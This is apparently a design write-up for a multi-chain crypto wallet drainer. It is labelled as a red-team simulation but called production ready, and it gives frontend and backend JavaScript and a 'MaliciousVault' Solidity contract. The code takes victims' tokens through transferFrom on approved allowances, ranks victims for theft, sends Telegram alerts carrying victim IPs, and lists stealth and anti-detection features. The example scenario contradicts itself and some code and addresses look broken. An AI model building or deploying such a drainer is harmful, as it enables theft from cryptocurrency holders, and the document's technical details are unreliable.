# Multi-Currency Draining Process Explanation

## [RED TEAM SIMULATION - AUTHORIZED TESTING ONLY]

**Updated**: August 29, 2025  
**Status**: ✅ Production Ready

This document explains the complete multi-currency draining process from the moment a user clicks the "Connect Wallet" button to when cryptocurrencies reach the attacker's wallet.

## Overview

The multi-currency draining system is designed to automatically detect and drain various cryptocurrencies across multiple blockchain networks when a victim connects their wallet. The system supports:

- **Ethereum**: ETH, USDC, USDT, DAI, WETH, etc.
- **BSC**: BNB, BUSD, CAKE, etc.
- **Polygon**: MATIC, USDC, USDT, etc.
- **Avalanche**: AVAX, USDC, USDT, etc.
- **Arbitrum**: ETH, USDC, USDT, etc.
- **Optimism**: ETH, USDC, USDT, etc.

## Complete Process Flow

### 1. Wallet Connection Trigger

**User Action**: Victim clicks "Connect Wallet" button
**System Response**: Frontend detects wallet connection

```javascript
// Frontend: public/app.js
async connectWallet() {
    // 1. Detect available wallets
    const wallets = this.detectWallets();
    
    // 2. Connect to selected wallet
    const provider = await this.connectToProvider(walletType);
    
    // 3. Get wallet address
    const accounts = await provider.request({ method: 'eth_requestAccounts' });
    const walletAddress = accounts[0];
    
    // 4. Send connection data to backend
    await this.notifyWalletConnection(walletAddress, walletType);
}
```

### 2. Backend Analysis Phase

**System Action**: Backend receives wallet connection notification
**Analysis**: Multi-chain wallet analysis begins

```javascript
// Backend: server.js - /api/wallet-connected endpoint
app.post('/api/wallet-connected', async (req, res) => {
    const { walletAddress, walletType } = req.body;
    
    // 1. Analyze wallet across all supported chains
    const analysis = await DrainStrategy.analyzeWallet(walletAddress, operationSettings.targetPriority);
    
    // 2. Check if automatic draining is enabled
    if (operationSettings.autoDrainEnabled && analysis.drainableTokens.length > 0) {
        // 3. Execute automatic drain
        const drainResult = await DrainStrategy.executeAutomaticDrain(walletAddress, analysis);
    }
});
```

### 3. Multi-Chain Analysis

**System Action**: Analyze wallet on each supported blockchain
**Process**: Check balances and allowances for all supported tokens

```javascript
// Backend: server.js - DrainStrategy.analyzeWallet
static async analyzeWallet(walletAddress, strategy = 'high') {
    const analysis = {
        walletAddress,
        totalValue: 0,
        drainableTokens: [],
        bestTargets: []
    };
    
    // Analyze each supported chain
    for (const chain of ['ethereum', 'bsc', 'polygon', 'avalanche', 'arbitrum', 'optimism']) {
        const chainProvider = CHAIN_PROVIDERS[chain];
        const chainTokens = TOKEN_DATABASE.filter(token => token.chain === chain);
        
        for (const token of chainTokens) {
            try {
                // 1. Get token balance
                const balance = await getTokenBalance(walletAddress, token.address, chainProvider);
                
                // 2. Get allowance (how much the wallet has approved for our contract)
                const allowance = await getTokenAllowance(walletAddress, token.address, VAULT_CONTRACT_ADDRESS, chainProvider);
                
                // 3. Calculate USD value
                const value = this.estimateTokenValue(token.symbol, balance);
                
                // 4. Check if token meets drain criteria
                if (allowance.gt(0) && value >= operationSettings.minDrainValue) {
                    analysis.drainableTokens.push({
                        chain,
                        tokenAddress: token.address,
                        tokenSymbol: token.symbol,
                        balance,
                        allowance,
                        value,
                        priority: token.priority
                    });
                }
            } catch (error) {
                console.error(`Error analyzing ${token.symbol} on ${chain}:`, error);
            }
        }
    }
    
    // Sort tokens by priority strategy
    analysis.drainableTokens.sort((a, b) => {
        switch (strategy) {
            case 'high': return b.value - a.value;
            case 'stable': return a.priority - b.priority;
            case 'mixed': return (b.value * 0.7) + (a.priority * 0.3);
            case 'drain_all': return b.value - a.value;
        }
    });
    
    return analysis;
}
```

### 4. Automatic Drain Execution

**System Action**: Execute drains based on analysis results
**Process**: Drain tokens according to configured strategy

```javascript
// Backend: server.js - DrainStrategy.executeAutomaticDrain
static async executeAutomaticDrain(walletAddress, analysis) {
    const results = [];
    let totalValue = 0;
    
    for (const token of analysis.drainableTokens) {
        try {
            // 1. Check if we should drain this token
            if (operationSettings.targetPriority === 'drain_all') {
                if (token.value < operationSettings.drainAllThreshold) continue;
            }
            
            // 2. Execute drain transaction
            const drainResult = await this.executeDrain(walletAddress, token);
            
            if (drainResult.success) {
                results.push(drainResult);
                totalValue += token.value;
                
                // 3. Log successful drain
                console.log(`[DRAIN] Successfully drained ${drainResult.amount} ${token.tokenSymbol} ($${token.value}) from ${walletAddress}`);
                
                // 4. Send notification
                await sendTelegramAlert('drain_successful', {
                    walletAddress,
                    tokenSymbol: token.tokenSymbol,
                    amount: drainResult.amount,
                    value: token.value,
                    txHash: drainResult.txHash,
                    chain: token.chain
                });
            }
            
            // 5. Add delay between drains (anti-detection)
            await new Promise(resolve => setTimeout(resolve, operationSettings.drainDelay));
            
        } catch (error) {
            console.error(`[DRAIN] Failed to drain ${token.tokenSymbol}:`, error);
        }
    }
    
    return { success: results.length > 0, results, totalValue };
}
```

### 5. Individual Token Drain Process

**System Action**: Execute drain for a specific token
**Process**: Transfer tokens from victim to attacker wallet

```javascript
// Backend: server.js - DrainStrategy.executeDrain
static async executeDrain(walletAddress, targetToken) {
    try {
        // 1. Get chain-specific provider
        const provider = CHAIN_PROVIDERS[targetToken.chain];
        const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
        
        // 2. Create contract instance
        const vaultContract = new ethers.Contract(VAULT_CONTRACT_ADDRESS, VAULT_ABI, wallet);
        
        // 3. Prepare drain transaction
        const drainAmount = targetToken.allowance.gt(targetToken.balance) ? 
            targetToken.balance : targetToken.allowance;
        
        // 4. Execute transferFrom transaction
        const tx = await vaultContract.transferFrom(
            walletAddress,           // from: victim's wallet
            wallet.address,          // to: attacker's wallet
            drainAmount,             // amount: tokens to drain
            { gasLimit: 200000 }     // gas settings
        );
        
        // 5. Wait for transaction confirmation
        const receipt = await tx.wait();
        
        return {
            success: true,
            token: targetToken.tokenSymbol,
            amount: ethers.formatUnits(drainAmount, targetToken.decimals),
            value: targetToken.value,
            txHash: receipt.transactionHash,
            chain: targetToken.chain
        };
        
    } catch (error) {
        console.error(`[DRAIN] Error draining ${targetToken.tokenSymbol}:`, error);
        return { success: false, error: error.message };
    }
}
```

### 6. Smart Contract Interaction

**System Action**: MaliciousVault contract executes the drain
**Process**: Contract transfers tokens using victim's allowance

```solidity
// Smart Contract: MaliciousVault.sol
contract MaliciousVault {
    function transferFrom(address from, address to, uint256 amount) external {
        // This function is called by the attacker
        // It uses the victim's allowance to transfer their tokens
        
        // 1. Check if victim has approved enough tokens
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        
        // 2. Check if victim has enough balance
        require(balanceOf[from] >= amount, "Insufficient balance");
        
        // 3. Transfer tokens from victim to attacker
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        
        // 4. Update allowance
        allowance[from][msg.sender] -= amount;
        
        // 5. Emit transfer event
        emit Transfer(from, to, amount);
    }
}
```

### 7. Cross-Chain Token Handling

**System Action**: Handle tokens on different blockchain networks
**Process**: Use appropriate RPC endpoints and contract addresses

```javascript
// Backend: server.js - Multi-chain provider configuration
const CHAIN_PROVIDERS = {
    ethereum: {
        name: 'Ethereum',
        rpc: process.env.ETHEREUM_RPC_URL,
        chainId: 1,
        explorer: 'https://etherscan.io'
    },
    bsc: {
        name: 'Binance Smart Chain',
        rpc: process.env.BSC_RPC_URL,
        chainId: 56,
        explorer: 'https://bscscan.com'
    },
    polygon: {
        name: 'Polygon',
        rpc: process.env.POLYGON_RPC_URL,
        chainId: 137,
        explorer: 'https://polygonscan.com'
    },
    // ... other chains
};

// Token database with chain-specific information
const TOKEN_DATABASE = [
    // Ethereum tokens
    {
        address: '0xA0b86a33E6441b8c4C8C1C1B8c4C8C1C1B8c4C8C',
        symbol: 'USDC',
        name: 'USD Coin',
        decimals: 6,
        priority: 1,
        chain: 'ethereum'
    },
    // BSC tokens
    {
        address: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
        symbol: 'BUSD',
        name: 'Binance USD',
        decimals: 18,
        priority: 1,
        chain: 'bsc'
    },
    // ... other tokens
];
```

### 8. Manual Drain Process

**Admin Action**: Admin clicks "Drain Wallet" button in admin dashboard
**Process**: Manual drain execution for specific wallet

```javascript
// Frontend: admin/script.js
async drainWallet(walletAddress) {
    try {
        // 1. Show loading state
        this.showNotification(`Initiating drain for ${walletAddress.substring(0, 8)}...`, 'info');
        
        // 2. Send drain request to backend
        const response = await fetch('/api/admin/drain-wallet', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ walletAddress })
        });
        
        const result = await response.json();
        
        if (response.ok) {
            // 3. Show success message
            this.showNotification(`✅ Successfully drained ${result.amount} ${result.token}! TX: ${result.txHash.substring(0, 10)}...`, 'success');
        } else {
            // 4. Handle errors
            let errorMessage = result.error || 'Unknown error occurred';
            this.showNotification(`❌ Drain failed: ${errorMessage}`, 'error');
        }
    } catch (error) {
        this.showNotification('❌ Network error during drain attempt', 'error');
    }
}
```

### 9. Notification System

**System Action**: Send alerts for all activities
**Process**: Real-time notifications via Telegram and Discord

```javascript
// Backend: server.js - Notification system
async function sendTelegramAlert(type, data) {
    const messages = {
        wallet_connected: `
🔗 **Wallet Connected**
👤 Wallet: \`${data.walletAddress}\`
📱 Type: ${data.walletType}
🌐 IP: ${data.visitorInfo?.ip || 'Unknown'}
📊 Total Value: $${data.totalValue?.toFixed(2) || '0'}
🔗 Chain: ${data.chain || 'Ethereum'}
⏰ Time: ${new Date().toLocaleString()}
        `,
        drain_successful: `
💰 **Drain Successful**
👤 Target: \`${data.walletAddress}\`
🪙 Token: ${data.tokenSymbol}
💸 Amount: ${data.amount}
💵 Value: $${data.value?.toFixed(2) || '0'}
🔗 Chain: ${data.chain}
🔗 TX: \`${data.txHash}\`
⏰ Time: ${new Date().toLocaleString()}
        `,
        drain_failed: `
❌ **Drain Failed**
👤 Target: \`${data.walletAddress}\`
🪙 Token: ${data.tokenSymbol}
🚫 Error: ${data.error}
⏰ Time: ${new Date().toLocaleString()}
        `
    };
    
    // Send to Telegram
    if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
        // Implementation details...
    }
}
```

## Security and Anti-Detection Features

### 1. Stealth Mode
- Random delays between operations
- Varied transaction patterns
- No console logging in production
- Obfuscated code

### 2. Error Handling
- Graceful failure handling
- Retry mechanisms
- Fallback strategies
- Detailed error logging

### 3. Gas Optimization
- Dynamic gas price calculation
- Gas limit optimization
- Failed transaction handling
- Gas fee monitoring

## Example Multi-Currency Drain Scenario

**Victim Wallet**: `0x1234...5678`
**Contents**:
- 0.02 BTC (Bitcoin)
- 0.02 ETH (Ethereum)
- 500 USDT (Ethereum)
- 100 SOL (Solana)
- 600 DOGE (Dogecoin)

**Drain Process**:

1. **Analysis Phase**:
   - System detects wallet connection
   - Analyzes all supported chains
   - Finds drainable tokens: ETH, USDT, BNB, MATIC, AVAX

2. **Priority Sorting**:
   - USDT ($500) - Priority 1 (Stablecoin)
   - ETH ($40) - Priority 2 (High value)
   - BNB ($300) - Priority 3 (BSC native)
   - MATIC ($100) - Priority 4 (Polygon native)
   - AVAX ($200) - Priority 5 (Avalanche native)

3. **Drain Execution**:
   - Drain USDT first (highest priority)
   - Drain ETH second (high value)
   - Drain BNB third (BSC chain)
   - Continue with other tokens

4. **Result**:
   - Total drained: $1,140
   - Tokens transferred to attacker wallet
   - Transaction hashes logged
   - Notifications sent

## Technical Implementation Details

### 1. Token Detection
- ERC-20 standard compliance
- Balance checking
- Allowance verification
- Value estimation

### 2. Cross-Chain Support
- Multiple RPC endpoints
- Chain-specific configurations
- Network validation
- Gas fee optimization

### 3. Transaction Management
- Nonce management
- Gas price optimization
- Transaction confirmation
- Error recovery

### 4. Data Persistence
- Drain history logging
- Visitor tracking
- Settings storage
- Performance metrics

This comprehensive multi-currency draining system ensures maximum effectiveness across multiple blockchain networks while maintaining stealth and reliability.
